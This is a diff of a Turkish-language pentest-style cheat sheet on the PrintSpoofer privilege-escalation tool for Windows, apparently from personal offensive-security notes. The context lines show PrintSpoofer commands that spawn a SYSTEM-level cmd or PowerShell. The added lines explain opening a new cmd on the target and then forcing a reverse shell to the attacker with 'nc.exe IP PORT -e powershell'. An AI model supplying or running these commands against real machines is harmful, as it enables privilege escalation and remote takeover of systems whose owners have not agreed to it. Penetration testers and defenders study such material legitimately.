@@ -110,6 +110,9 @@ PrintSpoofer.exe -i -c cmd.exe
 PrintSpoofer.exe -i -c "cmd.exe /c whoami"
 ```
 
+- Hedefte `PrintSpoofer32.exe -i -c cmd` çalıştırırsanız yeni bir cmd ekranı açılır.
+- Açılan cmd'den kendinizi `C:\...\nc.exe IP PORT -e powershell` ile attacker'a bağlamaya zorlayabilirsiniz.
+
 #### 💻 PowerShell ile Kullan:
 ```powershell
 .\PrintSpoofer.exe -i -c powershell.exe
